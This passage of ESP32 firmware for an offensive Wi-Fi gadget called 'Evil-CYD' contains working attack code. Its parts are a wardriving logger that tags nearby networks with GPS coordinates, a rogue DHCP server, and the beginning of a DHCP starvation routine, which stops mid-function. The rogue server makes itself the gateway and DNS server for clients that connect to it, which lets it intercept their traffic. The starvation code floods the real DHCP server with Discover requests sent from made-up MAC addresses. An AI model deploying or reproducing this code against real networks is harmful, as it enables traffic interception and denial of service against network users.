    int functionKeyWidth = tft.width() / numFunctionKeys;

    int y = tft.height() - functionKeyHeight; // Position at bottom of screen

    tft.setTextSize(1);

    for (int i = 0; i < numFunctionKeys; i++) {
      int x = i * functionKeyWidth;
      tft.drawRect(x, y, functionKeyWidth, functionKeyHeight, TFT_WHITE);

      // Calculate text width and height for centering using textWidth() and fontHeight()
      uint16_t textWidth = tft.textWidth(functionKeys[i]);
      uint16_t textHeight = tft.fontHeight();
      int textX = x + (functionKeyWidth - textWidth) / 2;
      int textY = y + (functionKeyHeight - textHeight) / 2;

      tft.setCursor(textX, textY);
      tft.print(functionKeys[i]);
    }
    tft.setTextSize(2);
  };

  // Draw initial keyboard and function keys
  drawKeyboard(currentKeys);
  drawFunctionKeys();

  // Input display area
  int inputDisplayY = 20;
  tft.setCursor(0, inputDisplayY);
  tft.print(inputText);

  while (!done) {
    TouchPoint touch = ts.getTouch();

    if (touch.zRaw != 0) {  // Check if the screen was touched
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());

      // Determine if a function key was pressed
      int functionKeyHeight = 40;
      int functionKeyY = tft.height() - functionKeyHeight;
      if (y >= functionKeyY) {
        // Function key area
        int functionKeyWidth = tft.width() / numFunctionKeys;
        int keyIndex = x / functionKeyWidth;
        if (keyIndex >= 0 && keyIndex < numFunctionKeys) {
          String key = functionKeys[keyIndex];

          if (key == "Shift") {  // Toggle uppercase/lowercase
            shiftOn = !shiftOn;
            if (shiftOn) {
              currentKeys = uppercaseKeys;
            } else {
              currentKeys = lowercaseKeys;
            }
            drawKeyboard(currentKeys);
          } else if (key == "Sym") {  // Toggle special characters
            specialOn = !specialOn;
            if (specialOn) {
              currentKeys = specialKeys;
            } else {
              currentKeys = lowercaseKeys;
            }
            drawKeyboard(currentKeys);
          } else if (key == "Space") {
            inputText += " ";
          } else if (key == "Del") {
            if (inputText.length() > 0) {
              inputText.remove(inputText.length() - 1);
            }
          } else if (key == "Menu") {
            // Handle returning to the menu
            waitAndReturnToMenu("Returning to menu...");
            return "";
          } else if (key == "OK") {
            done = true;
          }

          // Clear and reprint input line
          tft.fillRect(0, inputDisplayY, tft.width(), 30, TFT_BLACK);
          tft.setCursor(0, inputDisplayY);
          tft.print(inputText);
        }
      } else if (y >= 60) {
        // Main keyboard area
        int keyWidth = tft.width() / 10;
        int keyHeight = 30;
        int keyX = x / keyWidth;
        int keyY = (y - 60) / keyHeight;
        int keyIndex = keyY * 10 + keyX;

        if (keyIndex >= 0 && keyIndex < numKeys) {
          String key = currentKeys[keyIndex];

          inputText += key;
          if (shiftOn && !specialOn) {  // Return to lowercase after a character if Shift was active
            shiftOn = false;
            currentKeys = lowercaseKeys;
            drawKeyboard(currentKeys);
          }

          // Clear and reprint input line
          tft.fillRect(0, inputDisplayY, tft.width(), 30, TFT_BLACK);
          tft.setCursor(0, inputDisplayY);
          tft.print(inputText);
        }
      }
    }
    delay(150);  // Debounce touch
  }

  // Return collected input
  return inputText;
}
























// Constants defined here:
#define LOG_FILE_PREFIX "/wardriving/wardriving-0"
#define MAX_LOG_FILES 100
#define LOG_FILE_SUFFIX "csv"
#define LOG_COLUMN_COUNT 11
#define LOG_RATE 500

File myFile;
char logFileName[13];
int totalNetworks = 0;
unsigned long lastLog = 0;
int currentScreen = 1;  // Track which screen is currently displayed

const String wigleHeaderFileFormat = "WigleWifi-1.4,appRelease=Beta,model=Evil-CYD,release=Beta,device=Evil-CYD,display=7h30th3r0n3,board=Evil-CYD,brand=Evil-CYD";

char* log_col_names[LOG_COLUMN_COUNT] = {
  "MAC", "SSID", "AuthMode", "FirstSeen", "Channel", "RSSI", "CurrentLatitude", "CurrentLongitude", "AltitudeMeters", "AccuracyMeters", "Type"
};

String recentSSID;
String recentSSID1;
String recentSSID2;
String boardSSIDs[14];
int boardSeen[14] = {0};

// Structure for ESP-NOW messages
typedef struct struct_message {
  char bssid[64];
  char ssid[32];
  char encryptionType[16];
  int32_t channel;
  int32_t rssi;
  int boardID;
} struct_message;

// Create a struct_message called myData
struct_message myData;

// ESP-NOW Data Receive Callback Function
void OnDataRecv(const uint8_t* mac, const uint8_t* incomingData, int len) {
  File logFile = SD.open(logFileName, FILE_APPEND);
  memcpy(&myData, incomingData, sizeof(myData));

  // Display received data on screen 2
  if (currentScreen == 2) {
    displayReceivedData();
  }

  // Log data
  logFile.print(myData.bssid);
  logFile.print(",");
  String SSIDString = myData.ssid;
  SSIDString.replace(",", ".");  // Replace commas for CSV format
  logFile.print(SSIDString);
  logFile.print(",");
  logFile.print(myData.encryptionType);
  logFile.print(",");
  logFile.print(gps.date.year());
  logFile.print("-");
  logFile.print(gps.date.month());
  logFile.print("-");
  logFile.print(gps.time.hour());
  logFile.print("-");
  logFile.print(gps.time.minute());
  logFile.print("-");
  logFile.print(gps.time.second());
  logFile.print(",");
  logFile.print(myData.channel);
  logFile.print(",");
  logFile.print(myData.rssi);
  logFile.print(",");
  logFile.print(gps.location.lat(), 8);
  logFile.print(",");
  logFile.print(gps.location.lng(), 8);
  logFile.print(",");
  logFile.print(gps.altitude.meters());
  logFile.print(",");
  logFile.print(gps.hdop.value());
  logFile.print(",");
  logFile.print("WIFI");
  logFile.println();
  logFile.close();

  recentSSID2 = recentSSID1;
  recentSSID1 = recentSSID;
  recentSSID = myData.ssid;

  if (myData.boardID >= 1 && myData.boardID <= 14) {
    boardSSIDs[myData.boardID - 1] = myData.ssid;
    boardSeen[myData.boardID - 1]++;
  }

  totalNetworks++;
}

void updateFileName() {
  for (int i = 0; i < MAX_LOG_FILES; i++) {
    sprintf(logFileName, "%s%d.%s", LOG_FILE_PREFIX, i, LOG_FILE_SUFFIX);
    if (!SD.exists(logFileName)) {
      Serial.println("New file name chosen:");
      Serial.println(logFileName);
      break;
    } else {
      Serial.print(logFileName);
      Serial.println(" exists");
    }
  }
}

void printHeader() {
  File logFile = SD.open(logFileName, FILE_WRITE);
  if (logFile) {
    logFile.println(wigleHeaderFileFormat);
    for (int i = 0; i < LOG_COLUMN_COUNT; i++) {
      logFile.print(log_col_names[i]);
      if (i < LOG_COLUMN_COUNT - 1) logFile.print(',');
      else logFile.println();
    }
    logFile.close();
  }
}

void displayGeneralInfo() {
  tft.fillScreen(TFT_BLACK);
  int margin = 5;
  int lineHeight = 18;  // Ajustement pour permettre 14 lignes
  int col1Width = 30;
  int col2Width = 40;
  int col3Width = 100;
  int separatorWidth = 8;

  int x = margin;
  int y = margin;

  tft.setTextSize(1.5);  // Permettre 14 lignes sur l'écran de 320x240
  tft.setCursor(x, y);
  tft.printf("Lat:%.3f|Lon:%.3f  Sat:%d  Tn:%d",
             gps.location.lat(),
             gps.location.lng(),
             gps.satellites.value(),
             totalNetworks);
  y += lineHeight;
  tft.drawLine(margin, y, 320 - margin, y, taskbarDividerColor);
  y += 2;

  for (int i = 0; i < 14; i++) {  // Afficher 14 lignes
    if (boardSeen[i] > 0) {
      tft.setCursor(x, y);
      tft.printf("%2d", i + 1);
      tft.setCursor(x + col1Width + separatorWidth, y);
      tft.printf("%2d", boardSeen[i]);
      tft.setCursor(x + col1Width + col2Width + 2 * separatorWidth, y);
      tft.printf("%-10s", boardSSIDs[i].c_str()); // Ajusté pour 10 caractères max
      y += lineHeight;
      if (y > 240 - margin - lineHeight) break;
    }
  }

  y += 5;
  tft.setCursor(x, y);
  tft.print("Recent SSIDs:");
  String combinedSSIDs = recentSSID + ", " + recentSSID1 + ", " + recentSSID2;
  y += lineHeight;
  tft.setCursor(x, y);
  tft.printf("%s", combinedSSIDs.c_str());

}



unsigned long lastDisplayTime = 0;  // Variable to track the last display time
unsigned long displayInterval = 1000;  // 1 second interval

void displayReceivedData() {
  tft.fillScreen(TFT_BLACK);
  int y = 10;  // Position initiale
  int lineHeight = 24;

  tft.setTextSize(2);
  tft.setCursor(0, y);
  tft.println("Last data received:");
  y += lineHeight;

  tft.setCursor(0, y);
  tft.print("MAC: ");
  tft.println(myData.bssid);
  y += lineHeight;

  tft.setCursor(0, y);
  tft.print("SSID: ");
  tft.println(myData.ssid);
  y += lineHeight;

  tft.setCursor(0, y);
  tft.print("Encryption: ");
  tft.println(myData.encryptionType);
  y += lineHeight;

  tft.setCursor(0, y);
  tft.print("Channel: ");
  tft.println(myData.channel);
  y += lineHeight;

  tft.setCursor(0, y);
  tft.print("RSSI: ");
  tft.println(myData.rssi);
  y += lineHeight;

  tft.setCursor(0, y);
  tft.print("Lat: ");
  tft.println(gps.location.lat(), 8);
  y += lineHeight;

  tft.setCursor(0, y);
  tft.print("Lon: ");
  tft.println(gps.location.lng(), 8);
  y += lineHeight;

  tft.setCursor(0, y);
  tft.print("Altitude: ");
  tft.println(gps.altitude.meters());
  y += lineHeight;

  tft.setCursor(0, y);
  tft.print("HDOP: ");
  tft.println(gps.hdop.value());

}



bool exitWardrivingMaster = false;  // Flag pour indiquer quand quitter la boucle

void loopwardrivingmaster() {
  // Lecture des données GPS
  smartDelay(1000);

  // Récupération du point tactile
  TouchPoint touch = ts.getTouch();
  if (touch.zRaw != 0) {
    int x = map(touch.xRaw, minX, maxX, 0, tft.width());
    int y = map(touch.yRaw, minY, maxY, 0, tft.height());

    if (y > tft.height() - 30) {
      // Zone inférieure pour revenir au menu principal
      stopEspNow();
      waitAndReturnToMenu("Returning to menu...");
      exitWardrivingMaster = true;  // Mettre le flag de sortie à true
      return;
    } else if (x < tft.width() / 2) {
      // Zone gauche pour afficher les informations générales
      currentScreen = 1;
    } else {
      // Zone droite pour afficher les données reçues
      currentScreen = 2;
    }
  }

  // Affichage en fonction de l'écran actuel
  if (currentScreen == 1) {
    displayGeneralInfo();  // Affiche l'écran d'information générale
  } else if (currentScreen == 2) {
    displayReceivedData();  // Affiche l'écran de données reçues
  }
}



// If smartDelay already exists, don't redefine it
void smartDelay(unsigned long ms) {
  unsigned long start = millis();
  do {
    while (cardgps.available())
      gps.encode(cardgps.read());  // Read GPS data during the delay
    // Check buttons during the delay to improve responsiveness
  } while (millis() - start < ms);
}

// Function to stop ESP-NOW when exiting Wardriving Master mode
void stopEspNow() {
  esp_now_unregister_recv_cb();  // Unregister the receive callback to stop processing ESP-NOW messages
  Serial.println("ESP-NOW receiving process stopped.");
}


void startWardivingMaster() {
  Serial.println("Entering Wardriving Master mode...");
  WiFi.mode(WIFI_STA);

  if (esp_now_init() != 0) {
    Serial.println("Error initializing ESP-NOW");
    return;
  }

  // Enregistrement du callback de réception ESP-NOW
  esp_now_register_recv_cb(OnDataRecv);

  // Initialisation du fichier de log
  updateFileName();
  printHeader();

  // Réinitialiser le flag de sortie
  exitWardrivingMaster = false;

  // Boucle principale pour le mode Wardriving Master
  while (!exitWardrivingMaster) {
    loopwardrivingmaster();
  }
  // Exécuter les étapes de nettoyage une fois sortie de la boucle
  Serial.println("Exiting Wardriving Master mode...");
}





























#include <WiFiUdp.h>

WiFiUDP udp;
unsigned int localUdpPort = 67; // DHCP Port
IPAddress rogueIPRogue;              // Use the IP address obtained by the ESP32

IPAddress currentSubnetRogue;
IPAddress currentGatewayRogue;
IPAddress currentDNSRogue;
uint8_t offeredIpSuffixRogue = 101; // IP suffix used for DHCP offer
int cursorPositionRogue = 10;         // Initial cursor position
const int maxLinesRogue = 10;         // Number of lines to display
String displayLinesRogue[10];         // Array to store the last lines
int currentLineRogue = 0;             // Index of the current line

uint8_t availableIpSuffixesRogue[] = {101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150};
const int numAvailableIps = sizeof(availableIpSuffixesRogue) / sizeof(availableIpSuffixesRogue[0]);
bool ipAllocatedRogue[numAvailableIps] = {false}; // Track allocated IPs

#define MAX_CLIENTS 10
struct ClientInfo {
  uint8_t mac[6];
  uint8_t ipSuffix;
};

ClientInfo clients[MAX_CLIENTS];

void initClients() {
  for (int i = 0; i < MAX_CLIENTS; i++) {
    memset(clients[i].mac, 0, 6);
    clients[i].ipSuffix = 0;
  }
}


void rogueDHCP() {
  rogueIPRogue = WiFi.localIP();
  currentSubnetRogue = WiFi.subnetMask();
  currentGatewayRogue = WiFi.localIP();
  currentDNSRogue = WiFi.localIP();

  initClients(); // Initialize client info

  if (!udp.begin(localUdpPort)) {
    Serial.println("Error: UDP port 67 start failed.");
    tft.println("Error: UDP start failed.");
    delay(2000);
    stopCaptivePortal();
    if (!udp.begin(localUdpPort)) {
      Serial.println("Error: UDP port 67 start failed.");
      waitAndReturnToMenu("Error: UDP start failed.");
      return;
    }
  }

  tft.fillScreen(menuBackgroundColor);
  Serial.println("Rogue DHCP running...");
  updateDisplay("DHCP running...");
  screenDebounce();
  while (true) {
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0 && touch.yRaw > (tft.height() / 2)) {
      Serial.println("Returning to menu.");
      updateDisplay("Returning...");
      waitAndReturnToMenu("Return to menu.");
      break;
    }
    handleDnsRequestSerial();

    int packetSizeRogue = udp.parsePacket();
    if (packetSizeRogue > 0 && packetSizeRogue <= 512) {
      Serial.printf("Received packet, size: %d bytes\n", packetSizeRogue);
      updateDisplay("Packet received");

      uint8_t packetBufferRogue[512];
      udp.read(packetBufferRogue, packetSizeRogue);

      uint8_t messageTypeRogue = getDHCPMessageType(packetBufferRogue, packetSizeRogue);

      if (messageTypeRogue == 1) { // DHCP Discover
        Serial.println("DHCP Discover received. Preparing Offer...");
        updateDisplay("Discover. Preparing Offer...");
        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 2); // Message Type 2: DHCP Offer

        // Send the DHCP Offer
        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
        Serial.println("DHCP Offer sent.");
        updateDisplay("Offer sent.");

      } else if (messageTypeRogue == 3) { // DHCP Request
        Serial.println("DHCP Request received. Preparing ACK...");
        updateDisplay("Request. Preparing ACK...");
        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 5); // Message Type 5: DHCP ACK

        // Send the DHCP ACK
        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
        Serial.println("DHCP ACK sent.");
        updateDisplay("ACK sent.");
      }
    }
  }
}

uint8_t getDHCPMessageType(uint8_t *packetRogue, int packetSizeRogue) {
  // DHCP options start after 240 bytes
  int optionsIndexRogue = 240;
  while (optionsIndexRogue < packetSizeRogue) {
    uint8_t optionTypeRogue = packetRogue[optionsIndexRogue++];
    if (optionTypeRogue == 255) {
      break; // End Option
    } else if (optionTypeRogue == 0) {
      continue; // Pad Option, skip
    }
    if (optionsIndexRogue >= packetSizeRogue) break; // Prevent out-of-bounds access
    uint8_t optionLenRogue = packetRogue[optionsIndexRogue++];
    if (optionsIndexRogue + optionLenRogue > packetSizeRogue) break; // Prevent out-of-bounds access
    if (optionTypeRogue == 53 && optionLenRogue == 1) {
      return packetRogue[optionsIndexRogue]; // Return the DHCP message type
    }
    optionsIndexRogue += optionLenRogue; // Skip to the next option
  }
  return 0; // Unknown message type
}

void parseDHCPOptions(uint8_t *packetRogue, int packetSizeRogue, IPAddress &requestedIP, IPAddress &serverID) {
  // DHCP options start after 240 bytes
  int optionsIndexRogue = 240;
  while (optionsIndexRogue < packetSizeRogue) {
    uint8_t optionTypeRogue = packetRogue[optionsIndexRogue++];
    if (optionTypeRogue == 255) {
      break; // End Option
    } else if (optionTypeRogue == 0) {
      continue; // Pad Option, skip
    }
    if (optionsIndexRogue >= packetSizeRogue) break; // Prevent out-of-bounds access
    uint8_t optionLenRogue = packetRogue[optionsIndexRogue++];
    if (optionsIndexRogue + optionLenRogue > packetSizeRogue) break; // Prevent out-of-bounds access

    if (optionTypeRogue == 50 && optionLenRogue == 4) {
      // Requested IP Address
      requestedIP = IPAddress(packetRogue[optionsIndexRogue], packetRogue[optionsIndexRogue + 1], packetRogue[optionsIndexRogue + 2], packetRogue[optionsIndexRogue + 3]);
    } else if (optionTypeRogue == 54 && optionLenRogue == 4) {
      // Server Identifier
      serverID = IPAddress(packetRogue[optionsIndexRogue], packetRogue[optionsIndexRogue + 1], packetRogue[optionsIndexRogue + 2], packetRogue[optionsIndexRogue + 3]);
    }
    optionsIndexRogue += optionLenRogue; // Skip to the next option
  }
}

void prepareDHCPResponse(uint8_t *packetRogue, int &packetSizeRogue, uint8_t messageTypeRogue) {
  // Set BOOTREPLY
  packetRogue[0] = 2; // BOOTREPLY

  // Extract client MAC address
  uint8_t clientMac[6];
  memcpy(clientMac, &packetRogue[28], 6);

  // Variables to hold requested IP and server identifier
  IPAddress requestedIP(0, 0, 0, 0);
  IPAddress serverID(0, 0, 0, 0);

  // Parse DHCP options to get requested IP and server identifier
  parseDHCPOptions(packetRogue, packetSizeRogue, requestedIP, serverID);

  uint8_t offeredIpSuffix = 0;

  if (messageTypeRogue == 2) { // DHCP Offer
    // Allocate an IP address for the client
    offeredIpSuffix = allocateIpAddress(clientMac);
    if (offeredIpSuffix == 0) {
      Serial.println("No available IP addresses.");
      updateDisplay("No available IPs.");
      return;
    }
  } else if (messageTypeRogue == 5) { // DHCP ACK
    // Client is requesting a specific IP
    if (requestedIP != IPAddress(0, 0, 0, 0)) {
      if (requestedIP[0] == rogueIPRogue[0] && requestedIP[1] == rogueIPRogue[1] && requestedIP[2] == rogueIPRogue[2]) {
        // Check if requested IP is in our available IPs
        uint8_t requestedSuffix = requestedIP[3];
        // Check if requestedSuffix is in availableIpSuffixesRogue[]
        bool ipAvailable = false;
        for (int i = 0; i < numAvailableIps; i++) {
          if (availableIpSuffixesRogue[i] == requestedSuffix) {
            // Check if IP is already allocated
            if (!ipAllocatedRogue[i]) {
              // Allocate the IP to the client
              ipAllocatedRogue[i] = true;
              // Store the client info
              for (int j = 0; j < MAX_CLIENTS; j++) {
                if (clients[j].ipSuffix == 0 || memcmp(clients[j].mac, clientMac, 6) == 0) {
                  memcpy(clients[j].mac, clientMac, 6);
                  clients[j].ipSuffix = requestedSuffix;
                  break;
                }
              }
              offeredIpSuffix = requestedSuffix;
              ipAvailable = true;
              break;
            } else {
              // IP is already allocated
              // Check if it's allocated to the same client
              for (int j = 0; j < MAX_CLIENTS; j++) {
                if (clients[j].ipSuffix == requestedSuffix && memcmp(clients[j].mac, clientMac, 6) == 0) {
                  // IP is allocated to the same client
                  offeredIpSuffix = requestedSuffix;
                  ipAvailable = true;
                  break;
                }
              }
            }
          }
        }
      }
    } else {
      // No requested IP, allocate IP
      offeredIpSuffix = allocateIpAddress(clientMac);
      if (offeredIpSuffix == 0) {
        Serial.println("No available IP addresses.");
        updateDisplay("No available IPs.");
        return;
      }
    }
  }

  // Set your offered IP address (yiaddr)
  packetRogue[16] = rogueIPRogue[0];
  packetRogue[17] = rogueIPRogue[1];
  packetRogue[18] = rogueIPRogue[2];
  packetRogue[19] = offeredIpSuffix;

  // Display the allocated IP address
  char allocatedIpMessage[50];
  sprintf(allocatedIpMessage, "IP: %d.%d.%d.%d", rogueIPRogue[0], rogueIPRogue[1], rogueIPRogue[2], offeredIpSuffix);
  updateDisplay(allocatedIpMessage);

  // Set the server IP address (siaddr)
  packetRogue[20] = rogueIPRogue[0];
  packetRogue[21] = rogueIPRogue[1];
  packetRogue[22] = rogueIPRogue[2];
  packetRogue[23] = rogueIPRogue[3];

  // DHCP Magic cookie
  packetRogue[236] = 0x63;
  packetRogue[237] = 0x82;
  packetRogue[238] = 0x53;
  packetRogue[239] = 0x63;

  // Start adding DHCP options
  int optionIndexRogue = 240;

  // DHCP Message Type (Option 53)
  packetRogue[optionIndexRogue++] = 53;   // Option
  packetRogue[optionIndexRogue++] = 1;    // Length
  packetRogue[optionIndexRogue++] = messageTypeRogue; // Message Type

  // Server Identifier (Option 54)
  packetRogue[optionIndexRogue++] = 54;   // Option
  packetRogue[optionIndexRogue++] = 4;    // Length
  packetRogue[optionIndexRogue++] = rogueIPRogue[0];
  packetRogue[optionIndexRogue++] = rogueIPRogue[1];
  packetRogue[optionIndexRogue++] = rogueIPRogue[2];
  packetRogue[optionIndexRogue++] = rogueIPRogue[3];

  // Subnet Mask (Option 1)
  packetRogue[optionIndexRogue++] = 1;    // Option
  packetRogue[optionIndexRogue++] = 4;    // Length
  packetRogue[optionIndexRogue++] = currentSubnetRogue[0];
  packetRogue[optionIndexRogue++] = currentSubnetRogue[1];
  packetRogue[optionIndexRogue++] = currentSubnetRogue[2];
  packetRogue[optionIndexRogue++] = currentSubnetRogue[3];

  // Router (Gateway) (Option 3)
  packetRogue[optionIndexRogue++] = 3;    // Option
  packetRogue[optionIndexRogue++] = 4;    // Length
  packetRogue[optionIndexRogue++] = rogueIPRogue[0];
  packetRogue[optionIndexRogue++] = rogueIPRogue[1];
  packetRogue[optionIndexRogue++] = rogueIPRogue[2];
  packetRogue[optionIndexRogue++] = rogueIPRogue[3];

  // DNS Server (Option 6)
  packetRogue[optionIndexRogue++] = 6;    // Option
  packetRogue[optionIndexRogue++] = 4;    // Length
  packetRogue[optionIndexRogue++] = currentDNSRogue[0];
  packetRogue[optionIndexRogue++] = currentDNSRogue[1];
  packetRogue[optionIndexRogue++] = currentDNSRogue[2];
  packetRogue[optionIndexRogue++] = currentDNSRogue[3];

  // Lease Time (Option 51)
  packetRogue[optionIndexRogue++] = 51;   // Option
  packetRogue[optionIndexRogue++] = 4;    // Length
  packetRogue[optionIndexRogue++] = 0x00;
  packetRogue[optionIndexRogue++] = 0x01;
  packetRogue[optionIndexRogue++] = 0x51;
  packetRogue[optionIndexRogue++] = 0x80; // 1-day lease time (86400 seconds)

  // End Option
  packetRogue[optionIndexRogue++] = 255;

  // Update packet size
  packetSizeRogue = optionIndexRogue;
}

void sendDHCPResponse(uint8_t *packetRogue, int packetSizeRogue) {
  // Send the packet to the client port (68)
  udp.beginPacket(IPAddress(255, 255, 255, 255), 68);
  udp.write(packetRogue, packetSizeRogue);
  udp.endPacket();
}

uint8_t allocateIpAddress(uint8_t *clientMac) {
  // Check if this client already has an IP allocated
  for (int i = 0; i < MAX_CLIENTS; i++) {
    if (memcmp(clients[i].mac, clientMac, 6) == 0) {
      // Client found, return the allocated IP suffix
      return clients[i].ipSuffix;
    }
  }

  // Client not found, allocate a new IP
  for (int i = 0; i < numAvailableIps; i++) {
    if (!ipAllocatedRogue[i]) {
      ipAllocatedRogue[i] = true;
      // Store the client info
      for (int j = 0; j < MAX_CLIENTS; j++) {
        if (clients[j].ipSuffix == 0) { // Empty slot
          memcpy(clients[j].mac, clientMac, 6);
          clients[j].ipSuffix = availableIpSuffixesRogue[i];
          return clients[j].ipSuffix;
        }
      }
    }
  }
  return 0; // No available IPs
}


void updateDisplay(const char* message) {
  // Add the new message to the array
  displayLinesRogue[currentLineRogue] = String(message);
  currentLineRogue = (currentLineRogue + 1) % maxLinesRogue;

  // Clear the screen
  tft.fillScreen(menuBackgroundColor);

  // Display the last lines
  tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  int y = 10;
  for (int i = 0; i < maxLinesRogue; i++) {
    int index = (currentLineRogue - i - 1 + maxLinesRogue) % maxLinesRogue;
    if (!displayLinesRogue[index].isEmpty()) {
      tft.setCursor(0, y);
      tft.println(displayLinesRogue[index]);
      y += 16;
    }
  }


}



















uint32_t totalIPs = 0;

uint32_t calculateTotalIPs(IPAddress subnetMask) {
  uint32_t mask = ((uint32_t)subnetMask[0] << 24) | ((uint32_t)subnetMask[1] << 16) | ((uint32_t)subnetMask[2] << 8) | subnetMask[3];
  uint8_t prefixLength = 0;
  for (int i = 0; i < 32; i++) {
    if (mask & (1UL << (31 - i))) {
      prefixLength++;
    } else {
      break;
    }
  }
  uint8_t hostBits = 32 - prefixLength;
  uint32_t totalIPs = 1UL << hostBits;
  return totalIPs;
}

IPAddress currentIPStarvation;
IPAddress currentSubnet;
IPAddress currentGateway;
IPAddress currentDNS;

// DHCP variables
IPAddress broadcastIP(255, 255, 255, 255);
uint8_t macBase[6] = {0xAE, 0xAD, 0xBE, 0xEF, 0x00, 0x00};
IPAddress dhcpServerIP;
bool dhcpServerDetected = false;

unsigned int localUdpPortStarvation = 67;

uint32_t discoverCount = 0;
uint32_t offerCount = 0;
uint32_t requestCount = 0;
uint32_t ackCount = 0;
uint32_t nakCount = 0;
IPAddress lastAssignedIP;

void saveCurrentNetworkConfig() {
  currentIPStarvation = WiFi.localIP();
  currentSubnet = WiFi.subnetMask();
  currentGateway = WiFi.gatewayIP();
  currentDNS = WiFi.dnsIP();

  totalIPs = calculateTotalIPs(currentSubnet);

  Serial.println("Current network saved:");
  Serial.print("IP: ");
  Serial.println(currentIPStarvation);
  Serial.print("Subnet mask: ");
  Serial.println(currentSubnet);
  Serial.print("Gateway: ");
  Serial.println(currentGateway);
  Serial.print("DNS: ");
  Serial.println(currentDNS);

  tft.fillScreen(menuBackgroundColor);
  tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  tft.setCursor(0, 0);
  tft.println("Current network saved:");
  tft.printf("IP: %s\n", currentIPStarvation.toString().c_str());
  tft.printf("Subnet: %s\n", currentSubnet.toString().c_str());
  tft.printf("Gateway: %s\n", currentGateway.toString().c_str());
  tft.printf("DNS: %s\n", currentDNS.toString().c_str());

  delay(2000);
}

void disconnectWiFi() {
  WiFi.disconnect(true);
  Serial.println("WiFi disconnected.");

  tft.fillScreen(menuBackgroundColor);
  tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  tft.setCursor(0, 0);
  tft.println("WiFi disconnected.");

  delay(1000);
}

void configureStaticIP() {
  if (!WiFi.config(currentIPStarvation, currentGateway, currentSubnet, currentDNS)) {
    Serial.println("Failed to configure static IP.");
    tft.fillScreen(menuBackgroundColor);
    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    tft.setCursor(0, 0);
    tft.println("Failed to configure\n static IP.");

    delay(2000);
  } else {
    Serial.println("Static IP configured successfully.");
    tft.fillScreen(menuBackgroundColor);
    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    tft.setCursor(0, 0);
    tft.println("Static IP configured \nsuccessfully.");

    delay(1000);
  }
}

void reconnectWiFi(int networkIndex) {
  Serial.println("Reconnecting to WiFi...");
  tft.fillScreen(menuBackgroundColor);
  tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  tft.setCursor(0, 0);
  tft.println("Reconnecting to WiFi...");


  if (getWifiSecurity(networkIndex) == "Open") {
    Serial.println("Network is open, no password required.");
    WiFi.begin(ssid.c_str()); // Connexion sans mot de passe
  } else {
    Serial.println("Network requires a password.");
    WiFi.begin(ssid.c_str(), password.c_str());
  }

  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
    tft.print(".");

  }

  Serial.println("\nConnected to WiFi.");
  tft.println("\nConnected to WiFi.");

  delay(1000);
}



void detectDHCPServer() {
  unsigned long startMillis = millis();
  tft.fillScreen(menuBackgroundColor);
  tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  tft.setCursor(0, 0);
  tft.println("Detecting DHCP server...");
  tft.println("Press ENTER to cancel");

  dhcpServerDetected = false;

  while (millis() - startMillis < 16000) { // Maximum wait time of 16 seconds


    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0 && touch.yRaw > (tft.height() / 2)) {
      Serial.println("Detection cancelled by user");
      tft.fillScreen(menuBackgroundColor);
      tft.setCursor(0, 0);
      tft.printf("Detection cancelled");

      delay(2000);
      return;
    }

    sendDHCPDiscover(macBase); // Send DHCP Discover request

    // Wait for response for 5 seconds
    unsigned long responseStartMillis = millis();
    while (millis() - responseStartMillis < 5000) {
      int packetSize = udp.parsePacket();
      if (packetSize > 0) {
        uint8_t packetBuffer[512];
        udp.read(packetBuffer, packetSize);

        uint8_t messageType = parseDHCPMessageType(packetBuffer, packetSize);
        if (messageType == 2) { // DHCP Offer
          dhcpServerIP = IPAddress(packetBuffer[20], packetBuffer[21], packetBuffer[22], packetBuffer[23]);

          // Check if the detected DHCP server is 0.0.0.0
          if (dhcpServerIP.toString() == "0.0.0.0") {
            Serial.println("DHCP server detected as 0.0.0.0. Using gateway as fallback.");
            dhcpServerIP = currentGateway;
          }

          Serial.printf("DHCP server detected: %s\n", dhcpServerIP.toString().c_str());
          tft.printf("DHCP server found:\n%s\n", dhcpServerIP.toString().c_str());

          dhcpServerDetected = true;
          delay(2000);
          return; // DHCP server found
        }
      }
    }
  }

  if (!dhcpServerDetected) {
    // Fallback to using the gateway as the DHCP server
    dhcpServerIP = currentGateway;
    Serial.println("No DHCP server detected. Using gateway as fallback.");
    tft.fillScreen(menuBackgroundColor);
    tft.println("No DHCP server found.");
    tft.println("Using gateway as fallback:");
    tft.printf("Gateway: %s\n", dhcpServerIP.toString().c_str());

    delay(2000);
  }
}




int percentage = 0;
bool NAKFlagStarvation = false;
int NAKNumberStarvation = 50;

void startDHCPStarvation() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return;
  }

  discoverCount = 0;
  offerCount = 0;
  requestCount = 0;
  ackCount = 0;
  nakCount = 0;

  saveCurrentNetworkConfig();
  if (totalIPs == 0) {
    Serial.println("Error: Total IPs calculated as zero.");
    tft.fillScreen(menuBackgroundColor);
    tft.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    tft.setCursor(0, 0);
    tft.println("Error: Total IPs\ncalculated as zero.\nsettings to 255");
    totalIPs == 255;

    delay(2000);
  }
  disconnectWiFi();
  configureStaticIP();
  reconnectWiFi(currentListIndex);
  randomSeed(analogRead(0)); // Initialize random generator

  if (!udp.begin(68)) {
    Serial.println("Error: Failed to initialize UDP socket on port 68.");
    tft.fillScreen(menuBackgroundColor);
